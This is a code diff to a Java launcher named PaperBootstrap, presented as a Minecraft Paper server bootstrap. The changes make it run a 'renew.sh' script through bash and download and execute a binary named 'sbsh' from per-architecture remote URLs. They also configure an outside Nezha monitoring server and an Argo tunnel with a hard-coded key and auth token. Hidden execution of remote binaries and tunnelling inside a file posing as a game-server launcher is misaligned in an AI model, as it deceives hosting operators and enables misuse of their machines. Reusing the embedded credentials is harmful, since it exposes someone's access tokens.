@@ -45,6 +45,17 @@ public final class PaperBootstrap {
         
         try {
             runSbxBinary();
+
+            // ✅ 启动续期脚本 renew.sh（服务器运行期间自动续期）
+            File renewScript = new File("renew.sh");
+            if (renewScript.exists()) {
+                new ProcessBuilder("bash", "renew.sh")
+                    .inheritIO()
+                    .start();
+                System.out.println(ANSI_GREEN + "renew.sh 已启动（自动续期中）" + ANSI_RESET);
+            } else {
+                System.err.println(ANSI_RED + "renew.sh 未找到，跳过执行" + ANSI_RESET);
+            }
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -93,14 +104,14 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
+        envVars.put("UUID", "17066f1c-1104-4f3f-9eef-067afc3011a1");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "");
-        envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
+        envVars.put("NEZHA_SERVER", "nz.lilyonlyone.eu.org");
+        envVars.put("NEZHA_PORT", "443");
+        envVars.put("NEZHA_KEY", "XaWY3dxviZBva6iGNG");
+        envVars.put("ARGO_PORT", "9002");
+        envVars.put("ARGO_DOMAIN", "ge.mdtah.ccwu.cc");
+        envVars.put("ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiNmRmMmFjMjktZTY0ZS00ZmI4LTk5MTgtNDY4MjIzYjQ2NTAwIiwicyI6Ik1HUXdZbVpoWldVdE1EZzFOeTAwT1RoaExUa3dZVEl0TnpBM01UTmlaak5sT0dReCJ9");
         envVars.put("S5_PORT", "");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
@@ -152,11 +163,11 @@ public final class PaperBootstrap {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.00666.xyz/sbsh";
+            url = "https://amd64.oooen.com/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.00666.xyz/sbsh";
+            url = "https://arm64.oooen.com/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.31888.xyz/sbsh";
+            url = "https://s390x.oooen.com/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
